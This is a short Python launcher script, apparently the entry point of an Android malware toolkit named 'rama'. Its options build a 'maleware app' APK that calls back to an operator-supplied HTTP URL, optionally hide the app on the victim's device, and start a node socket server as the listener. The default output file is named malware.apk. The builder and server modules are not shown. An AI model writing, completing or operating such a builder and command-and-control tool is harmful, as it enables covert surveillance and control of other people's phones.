import os
import argparse
from modules import apkbuilder,banner
import time
#bannder
os.system("clear")
print(banner.banner)
#command lin utiliy
commandLine=argparse.ArgumentParser(description = "Welcome to rama help") #it like create object

#command first
commandLine.add_argument("-b","--build",action="count",help=" -b <true> build maleware app")
#commandLine.add_argument("-i","--host",type=str,help="<https> server domain to connect app \n WORING: don't use tcp it take http server domain")
commandLine.add_argument("-ah","--autohide",default=False,type=bool,help="-a use for autohide apk DEFAULT=false")
commandLine.add_argument("-l","--listen",type=int,help="<port> where http server is running")
commandLine.add_argument("-o","--output",default="malware.apk",type=str,help="<filename> save build app as filename")
getCommand=commandLine.parse_args()

def conditions():
    if(getCommand.build):
        connection_url=input("\033[94mEnter http url : \033[92m")
        print("\033[0m")
        builder=apkbuilder.builder()
        builder.build(connection_url,getCommand.output,getCommand.autohide)
    if(getCommand.listen):
        os.system(f"node server/socket.js {getCommand.listen}")
conditions()
